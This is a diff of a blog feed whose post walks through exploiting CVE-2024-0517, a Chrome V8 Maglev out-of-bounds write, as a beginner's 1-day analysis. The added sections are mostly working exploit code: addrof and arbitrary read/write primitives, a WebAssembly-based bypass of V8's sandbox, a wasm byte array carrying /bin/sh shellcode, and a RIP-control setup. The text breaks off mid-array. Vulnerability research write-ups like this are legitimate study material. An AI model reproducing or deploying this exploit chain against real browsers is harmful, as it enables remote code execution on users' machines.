@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-08-16T17:51:37+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Minkyun Sung</title><subtitle>Be a good Hacker</subtitle><author><name>Minkyun Sung</name><email>bnovkebin@gmail.com</email></author><entry><title type="html">CVE-2024-0517 Chrome V8 Out of Bounds Write</title><link href="http://localhost:4000/blog/CVE-2024-0517/" rel="alternate" type="text/html" title="CVE-2024-0517 Chrome V8 Out of Bounds Write" /><published>2024-08-14T00:00:00+09:00</published><updated>2024-08-14T00:00:00+09:00</updated><id>http://localhost:4000/blog/CVE-2024-0517</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2024-0517/"><![CDATA[<p><br /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-08-17T02:38:44+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Minkyun Sung</title><subtitle>Be a good Hacker</subtitle><author><name>Minkyun Sung</name><email>bnovkebin@gmail.com</email></author><entry><title type="html">CVE-2024-0517 Chrome V8 Out of Bounds Write</title><link href="http://localhost:4000/blog/CVE-2024-0517/" rel="alternate" type="text/html" title="CVE-2024-0517 Chrome V8 Out of Bounds Write" /><published>2024-08-14T00:00:00+09:00</published><updated>2024-08-14T00:00:00+09:00</updated><id>http://localhost:4000/blog/CVE-2024-0517</id><content type="html" xml:base="http://localhost:4000/blog/CVE-2024-0517/"><![CDATA[<p><br /></p>
 <h1 id="introduction">Introduction</h1>
 <p>In this blog, we look into a vulnerability in Chrome V8, CVE-2024-0517. This vulnerability occurs when Maglev, the JIT compiler of V8, compiles a class that has a parent class. <br />
 Since I’m a beginner in the cybersecurity field and this is my first time analyzing a 1-day exploit, I had a lot of difficulty understanding it. Therefore, I’ll explain this vulnerability step by step. <br /></p>
@@ -163,50 +163,224 @@ The Exploitation flow is : <br />
 
 <p><br /></p>
 <h1 id="exploitation">Exploitation</h1>
-<center> <img src="https://github.com/user-attachments/assets/61a32f48-8f3c-408c-8e2b-b26f514b7a91" /> </center>
-<p>Using an OOB wirte, we could make a type confusion between two objects(x array &amp; a array) with different types. <br />
-The first one has a PACKED_ELEMENTS type. And the other one has a PACKED_DOUBLE_ELEMENTS type. <br />
-An array object that has PACKED_ELEMENTS stores Object or Integer. <br />
-Same thing with PACKED_DOUBLE_ELEMENTS stores Float value. <br />
-We know that their elements have same address in heap. Furthermore an overlapped memory is read differently. If we store an object at x[0], x array reads that memory as an object. However a array reads as a float value, that means we could leak the address of stored object.<br /></p>
-<center> <img src="https://github.com/user-attachments/assets/483980ba-1f87-4d1d-886a-539d3b201ee3" /> </center>
 
 <h2 id="triggering-the-vulnarability">Triggering the Vulnarability</h2>
 <p>I used the code on exodus blog. For the reason that doesn’t trigger well the vulnerability, I tried to change number of times and size of array for garbage collection. <br />
-After triggered vulnerability, memory structure in our environment is same with <a href="https://github.com/user-attachments/assets/61a32f48-8f3c-408c-8e2b-b26f514b7a91">this</a> that I uploaded on Exploitation. <br />
+After triggered vulnerability, memory structure in our environment is same with <a href="https://github.com/user-attachments/assets/61a32f48-8f3c-408c-8e2b-b26f514b7a91">this</a> that we will see on Addrof primitive part. <br />
 Before analyzing the full-exploit code is <a href="https://github.com/bnovkebin/bnovkebin.github.io/blob/main/_posts/2024/20240814/exploit.js" target="_blank">here</a>. <br />
-Attention : I tried to make the stable code, but I didn’t success. This means that my code doesn’t exploit well. The vulnerability is always triggered, but the positions of a array and rwarr arr aren’t sufficient to exploit ( addr_a &lt; addr_rwarr ). The other things don’t have any problem.</p>
+Attention : I tried to make the stable code, but I didn’t success. This means that my code doesn’t exploit well. The vulnerability is always triggered, but the positions of a array and rwarr arr aren’t sufficient to exploit ( addr_a &lt; addr_rwarr ). The other things don’t have any problem. <br /></p>
 
 <p><br /></p>
 <h2 id="exploit-primitives">Exploit primitives</h2>
-<p>Now we made an OOB write in heap, using that we will implement some primitives that lead to exploit. <br />
-In this part we will use corrupted memory to create an another bunch of objects that will be able to resist against garbage collection in future.</p>
+<p>Now we made in OOB write in heap, using that we will implement some primitives that lead to exploit. <br />
+I will explain mainly the machanisms of primitives. <br /> 
+And in this part we will use corrupted memory to create an another bunch of objects that will be able to resist against garbage collection in future. <br /></p>
 
 <p><br /></p>
-<h3 id="addrof">addrof</h3>
+<h3 id="initial-addrof-primitive">Initial Addrof Primitive</h3>
 
-<h3 id="write">write</h3>
+<p>This primitive is very intuitive. Seeing the image of memory structure, we could analyze immediately. <br /></p>
+<center> <img src="https://github.com/user-attachments/assets/61a32f48-8f3c-408c-8e2b-b26f514b7a91" /> </center>
+<p>Using an OOB wirte, we could make a type confusion between two objects(x array &amp; a array) with different types. <br />
+The first one has a PACKED_ELEMENTS type. And the other one has a PACKED_DOUBLE_ELEMENTS type. <br />
+An array object that has PACKED_ELEMENTS stores <strong>“Object”</strong> or <strong>“Integer”</strong>. <br />
+Same thing with PACKED_DOUBLE_ELEMENTS stores <strong>“Float value”</strong>. <br />
+We know that their elements have same address in heap. Furthermore an overlapped memory is read differently. If we store an object at x[0], x array reads that memory as an object. However a array reads as a float value, that means we could leak the address of stored object.<br /></p>
 
+<p><br /></p>
+<h3 id="change-length-of-a-array">Change length of a array</h3>
+<p>This part is similar that we did in previous primitive. Setting x[5] to 0x10000, ‘array x’ reads here for integer(0x10000), but for ‘array a’ here is a memory that indicates size of the array. Therefore size of array a is changed to 0x10000 and we could use it as modified size.</p>
+<center> <img src="https://github.com/user-attachments/assets/88d6ed3a-9541-4b84-bc96-e20ca59e9ee8" /> </center>
+<p><br /></p>
+
+<p><br /></p>
+<h3 id="initial-write-primitive">Initial Write Primitive</h3>
+<p>Considering only the case <strong>addr_a &lt; addr_rwarr</strong>, obtain offset between their adresses. And this offset will be used to corrupt elements field of rwarr array. Why we want to write this point? If we read a value of rwarr array after corrupting elements field, rwarr tries to find the value going to pointer of elements filed. <br />
+In other words, if we write a value in rwarr array, it will be stored in elements of corrupted pointer. <br /></p>
+<center> <img src="https://github.com/user-attachments/assets/1e5add99-ae5a-48a7-8f34-58fca4bd673d" /> </center>
+<p><br /></p>
+
+<p><br /></p>
+<h3 id="gc-resistance">GC Resistance</h3>
+<p>We recognize that there is garbage collection. If heap is filled, Garbage collector will be executed and it cleans or shifts some objects. Then the offset obtained becomes useless. For this reason, we allocate some objects and move them to old space using GC, and corrupt the objects with Initial primitives. After, fix the objects in young space(<em>a &amp; rwarr array</em>). In this way Garbage Collector doesn’t realize corruption and we obtain stable primitives. <br />
+The following code shows this : <br /></p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//create 3 objects</span>
+<span class="kd">let</span> <span class="nx">changer</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span><span class="mf">2.2</span><span class="p">,</span><span class="mf">3.3</span><span class="p">,</span><span class="mf">4.4</span><span class="p">,</span><span class="mf">5.5</span><span class="p">,</span><span class="mf">6.6</span><span class="p">]</span>
+<span class="kd">let</span> <span class="nx">leaker</span>  <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span><span class="mf">2.2</span><span class="p">,</span><span class="mf">3.3</span><span class="p">,</span><span class="mf">4.4</span><span class="p">,</span><span class="mf">5.5</span><span class="p">,</span><span class="mf">6.6</span><span class="p">]</span>
+<span class="kd">let</span> <span class="nx">holder</span>  <span class="o">=</span> <span class="p">{</span><span class="na">p1</span><span class="p">:</span> <span class="mh">0x1234</span><span class="p">,</span> <span class="na">p2</span><span class="p">:</span> <span class="mh">0x1234</span><span class="p">,</span> <span class="na">p3</span><span class="p">:</span> <span class="mh">0x1234</span><span class="p">};</span>
+
+<span class="c1">//get addr of objects</span>
+<span class="kd">let</span> <span class="nx">changer_addr</span> <span class="o">=</span> <span class="nf">addrof_tmp</span><span class="p">(</span><span class="nx">changer</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">leaker_addr</span> <span class="o">=</span> <span class="nf">addrof_tmp</span><span class="p">(</span><span class="nx">leaker</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">holder_addr</span> <span class="o">=</span> <span class="nf">addrof_tmp</span><span class="p">(</span><span class="nx">holder</span><span class="p">);</span>
+
+<span class="c1">//corrupt that objects</span>
+<span class="nx">u32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">holder_addr</span><span class="p">;</span>
+<span class="nx">u32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc</span><span class="p">;</span>
+<span class="kd">let</span> <span class="nx">original_leaker_bytes</span> <span class="o">=</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+<span class="nx">u32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">leaker_addr</span><span class="p">;</span>
+<span class="nx">u32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc</span><span class="p">;</span>
+
+<span class="nf">v8h_write64</span><span class="p">(</span><span class="nx">changer_addr</span><span class="o">+</span><span class="mh">0x8</span><span class="p">,</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="nf">v8h_write64</span><span class="p">(</span><span class="nx">leaker_addr</span><span class="o">+</span><span class="mh">0x8</span><span class="p">,</span> <span class="nx">original_leaker_bytes</span><span class="p">);</span>
+
+<span class="c1">//fix the corruption to the objects in Old Space</span>
+<span class="nx">x</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nx">rwarr</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<p>After executing above code, the memory structure of three objects(<span style="color: orange;">changer</span>,<span style="color: yellow;"> leaker</span>, <span style="color: blue;">holder</span>) is as follows :</p>
+<center> <img src="https://github.com/user-attachments/assets/c8ec8101-7e4d-4a76-a7c2-038d05215dbc" /> </center>
+<center> <img src="https://github.com/user-attachments/assets/69c1448a-4ada-441a-8186-5b6fb578d5ed" /> </center>
+<p><br /></p>
+
+<p>Short explanation : <br /></p>
+<ul>
+  <li>changer[0] == elements and size of metadata of leaker(0x1c559d &amp; 0x1c55a1)</li>
+  <li>leaker[0] == elements and in-object property 1 of metadata of holder(0x1c55ed &amp; 0x1c55f1)</li>
+</ul>
+
+<p><br /></p>
+<h3 id="final-readwrite-primitives">Final Read/Write Primitives</h3>
+<p>Changing Changer[0] leads to point the value where we want with leaker array. <br />
+If we read it, this will be read primitive. <br />
+Else we write it, this will be write primitive. <br /></p>
+
+<p>And the code for these primitives are : <br /></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">v8h_read64</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">original_leaker_bytes</span> <span class="o">=</span> <span class="nx">changer</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+        <span class="nx">u32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span><span class="o">-</span><span class="mi">8</span><span class="p">;</span>
+        <span class="nx">u32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc</span><span class="p">;</span>
+        <span class="nx">changer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+        <span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">leaker</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+        <span class="nx">changer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">original_leaker_bytes</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nf">f2i</span><span class="p">(</span><span class="nx">ret</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">v8h_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">original_leaker_bytes</span> <span class="o">=</span> <span class="nx">changer</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+        <span class="nx">u32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span><span class="o">-</span><span class="mi">8</span><span class="p">;</span>
+        <span class="nx">u32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc</span><span class="p">;</span>
+        <span class="nx">changer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+        <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">leaker</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+        <span class="nx">u32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
+        <span class="nx">leaker</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+        <span class="nx">changer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">original_leaker_bytes</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><br /></p>
+<h3 id="final-addrof-primitive">Final Addrof Primitive</h3>
+<p>Lastly we store target object in in-object property of holder and read that memory with leaker to obtain address as raw pointer. <br />
+<br />
+The code for addrof primitive is as follows : <br /></p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">holder</span><span class="p">.</span><span class="nx">p2</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
+        <span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">leaker</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+        <span class="nx">holder</span><span class="p">.</span><span class="nx">p2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nf">f2i</span><span class="p">(</span><span class="nx">ret</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><br /></p>
 <h2 id="bypass-ubercage-with-webassembly">Bypass ubercage with WebAssembly</h2>
-<ol>
-  <li>WebAssembly <br /></li>
-</ol>
+<p>To bypass ubercage, the mitigation of V8, we could use WebAssembly. <br />
+The region that hold WebAssembly code has RWX permissions. And this region is observed when WebAssembly instance is created. To execute WebAssembly function v8 uses the 64 bit raw pointer to RWX region that is stored close-by Instance. The pointer is called only once to initilize WebAssembly function. Therefore we could think creating two WebInstances and use them one for saving shellcode and another one for corrupting the 64 bit pointer to shellcode. Offsets are different by version, then you have to check offset in your environment.</p>
 
-<h3 id="shellcode-smuggling">Shellcode Smuggling</h3>
+<h3 id="store-shellcode">Store Shellcode</h3>
+<p>Firstly we store shellcode in rwx region. As we create a WebAssembly instance RWX region will be generated. Then execute WebAssembly function to store WebAssembly binary(that has shellcode) into that region. <br /></p>
 
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">shell_wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">([</span>
+    <span class="mi">0</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">96</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">133</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">193</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">203</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">235</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">11</span>
+  <span class="p">]);</span>
+
+<span class="kd">let</span> <span class="nx">shell_wasm_module</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nc">Module</span><span class="p">(</span><span class="nx">shell_wasm_code</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">shell_wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nc">Instance</span><span class="p">(</span><span class="nx">shell_wasm_module</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">shell_func</span> <span class="o">=</span> <span class="nx">shell_wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
+
+<span class="nf">shell_func</span><span class="p">();</span>
+
+<span class="kd">let</span> <span class="nx">shell_wasm_instance_addr</span> <span class="o">=</span> <span class="nf">addrof</span><span class="p">(</span><span class="nx">shell_wasm_instance</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">shell_wasm_rwx_addr</span> <span class="o">=</span> <span class="nf">v8h_read64</span><span class="p">(</span><span class="nx">shell_wasm_instance_addr</span> <span class="o">+</span> <span class="mh">0x48</span><span class="nx">n</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">shell_func_code_addr</span> <span class="o">=</span> <span class="nx">shell_wasm_rwx_addr</span> <span class="o">+</span> <span class="mh">0xB40</span><span class="nx">n</span><span class="p">;</span>
+<span class="kd">let</span> <span class="nx">shell_code_addr</span> <span class="o">=</span> <span class="nx">shell_func_code_addr</span> <span class="o">+</span> <span class="mh">0x2D</span><span class="nx">n</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>When I investigate about WebAssembly code I had got problems to find information of it. <br />
+Therefore I explain things all I know here. <br /></p>
+
+<ul>
+  <li>Where is RWX pointer? : <br />
+It is <strong>jump_table_start</strong> of WebAssembly Instance. <br /></li>
+</ul>
+<center> <img src="https://github.com/user-attachments/assets/65579b20-3bd5-45e9-8e7b-716da901d33c" width="50%" heigth="50%" /> </center>
+<p><br /></p>
+<ul>
+  <li>Why offset is 0x48? : <br />
+Difference between adresses of instance and jump_table_addr is 0x48. <br /></li>
+  <li>What means 0xB40 and 0x2D? : <br />
+If you watch change of memory in rwx region to debug, you will see where starts WebAssembly binary(0xB40) and also shellcode(0x2D). <br /></li>
+</ul>
+
+<p><br /></p>
 <h3 id="rip-control">RIP control</h3>
+<p>Second WebAssembly code is sufficient, if you can just execute it. <br />
+This time we corrupt rwx pointer of this instance. <br />
+Then if we call WebAssembly function at first, it tries to call jump_table to initialize, by reason of the corrupted rwx pointer RIP moves to shellcode.</p>
+
+<p>Keep in mind that I said in second line, you don’t have to analyze the code at bottom. Try to make your WebAssembly code and to execute normally.</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">tbl</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nc">Table</span><span class="p">({</span>
+        <span class="na">initial</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
+        <span class="na">element</span><span class="p">:</span> <span class="dl">"</span><span class="s2">anyfunc</span><span class="dl">"</span>
+<span class="p">});</span>
+
+<span class="kd">const</span> <span class="nx">importObject</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="na">imports</span><span class="p">:</span> <span class="p">{</span> <span class="na">imported_func</span> <span class="p">:</span> <span class="p">(</span><span class="nx">n</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="p">},</span>
+        <span class="na">js</span><span class="p">:</span> <span class="p">{</span> <span class="nx">tbl</span> <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="kd">var</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">([</span>
+<span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">124</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">124</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">124</span><span class="p">,</span><span class="mi">124</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">125</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">117</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span 